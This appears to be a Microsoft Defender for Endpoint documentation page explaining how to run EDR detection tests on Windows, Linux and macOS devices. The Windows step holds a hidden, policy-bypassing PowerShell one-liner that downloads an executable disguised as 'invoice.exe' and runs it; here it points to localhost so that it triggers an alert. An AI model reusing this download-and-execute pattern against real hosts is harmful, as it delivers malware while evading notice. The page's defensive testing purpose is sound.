---
title: EDR detection test for verifying device's onboarding and reporting service
description: EDR detection test to verify the device's proper onboarding and reporting to the service.
ms.service: defender-endpoint
ms.author: deniseb
author: denisebmsft
ms.localizationpriority: medium
manager: deniseb
audience: ITPro
ms.collection: 
- m365-security
- tier3
- mde-macos
ms.custom: admindeeplinkDEFENDER
ms.topic: how-to
ms.subservice: edr
search.appverid: met150
ms.date: 04/30/2025
---

# EDR detection test for verifying device's onboarding and reporting services

#### Applies to:

- [Microsoft Defender for Endpoint Plan 2](microsoft-defender-endpoint.md)
- [Microsoft Defender for Business](https://www.microsoft.com/security/business/endpoint-security/microsoft-defender-business)

## Scenario requirements and setup

- Windows client devices must be running Windows 11, Windows 10 version 1709 build 16273 or newer, Windows 8.1, or Windows 7 SP1.
- Windows server devices must be running Windows Server 2025, Windows Server 2022, Windows Server 2019, Windows Server 2016, Windows Server 2012 R2, or Windows Server 2008 R2 SP1.
- Linux servers must be running a supported version (see [Prerequisites for Microsoft Defender for Endpoint on Linux](mde-linux-prerequisites.md))
- Devices must be onboarded to Defender for Endpoint

Endpoint detection and response for Endpoint provide advanced attack detections that are near real-time and actionable. Security analysts can prioritize alerts effectively, gain visibility into the full scope of a breach, and take response actions to remediate threats. You can run an EDR detection test to verify that the device is properly onboarded and reporting to the service. This article describes how to run an EDR detection test on a newly onboarded device.

### Windows

1. Open a Command Prompt window.

2. At the prompt, copy and run the following command. The Command Prompt window closes automatically.

   ```powershell
   powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-WDATP-test\\invoice.exe');Start-Process 'C:\\test-WDATP-test\\invoice.exe'
   ```

3. If successful, the detection test is marked as completed and a new alert appears within a few minutes.

### Linux

1. Download [script file](https://aka.ms/MDE-Linux-EDR-DIY) to an onboarded Linux server. 

   ```bash
   curl -o ~/Downloads/MDE-Linux-EDR-DIY.zip -L https://aka.ms/MDE-Linux-EDR-DIY
   ```

2. Extract the zipped folder. 

   ```bash
   unzip ~/Downloads/MDE-Linux-EDR-DIY.zip
   ```

3. Run the following command to give the script executable permission: 

   ```bash
   chmod +x ./mde_linux_edr_diy.sh
   ```

4. Run the following command to execute the script:

   ```bash
   ./mde_linux_edr_diy.sh
   ```

   After a few minutes, a detection should be raised in the [Microsoft Defender portal](https://security.microsoft.com). Look at the alert details, machine timeline, and perform your typical investigation steps.
 
### macOS

1. In your browser, Microsoft Edge for Mac or Safari, download *MDATP MacOS DIY.zip* from [https://aka.ms/mdatpmacosdiy](https://aka.ms/mdatpmacosdiy) and extract the zipped folder.

      The following prompt appears:

      > Do you want to allow downloads on "mdatpclientanalyzer.blob.core.windows.net"?<br/>
      > You can change which websites can download files in **Websites Preferences**.

4. Click **Allow**.

5. Open **Downloads**.

6. You must be able to see **MDATP MacOS DIY**.

   > [!TIP]
   > If you double-click **MDATP MacOS DIY**, you will get the following message:
   >
   > > **"MDATP MacOS DIY" cannot be opened because the developer cannot be verified.**<br/>
   > > macOS cannot verify that this app is free from malware.<br/>
   > > **[Move to Trash]** **[Done]**

7. Click **Done**.

8. Right-click **MDATP MacOS DIY**, and then click **Open**.

    The system displays the following message:

    > **macOS cannot verify the developer of MDATP MacOS DIY. Are you sure you want to open it?**<br/>
    > By opening this app, you will be overriding system security which can expose your computer and personal information to malware that may harm your Mac or compromise your privacy.

9. Click **Open**.

    The system will display the following message:

    > Microsoft Defender for Endpoint - macOS EDR DIY test file<br/>
    > Corresponding alert will be available in the MDATP portal.

10. Click **Open**.

    In few minutes, an alert *macOS EDR Test Alert* is raised.

11. Go to Microsoft Defender portal (https://security.microsoft.com/).

12. Go to the **Alert** Queue.

    :::image type="content" source="media/b8db76c2-c368-49ad-970f-dcb87534d9be.png" alt-text="Screenshot that shows a macOS EDR test alert that shows severity, category, detection source, and a collapsed menu of actions":::

    The macOS EDR test alert shows severity, category, detection source, and a collapsed menu of actions. Look at the alert details and the device timeline, and perform the regular investigation steps.


## Next steps

If you're experiencing issues with application compatibility or performance, you might consider adding exclusions. See the following articles for more information:

- [Configure and validate exclusions for Microsoft Defender for Endpoint on macOS](mac-exclusions.md)
- [Address false positives/negatives in Microsoft Defender for Endpoint](defender-endpoint-false-positives-negatives.md)
- [Manage suppression rules](manage-suppression-rules.md)
- [Create indicators of compromise (IoC)](indicators-overview.md)
- [Create and manage custom detections rules](/defender-xdr/custom-detection-rules)

Also, see the [Microsoft Defender for Endpoint Security Operations Guide](mde-sec-ops-guide.md).
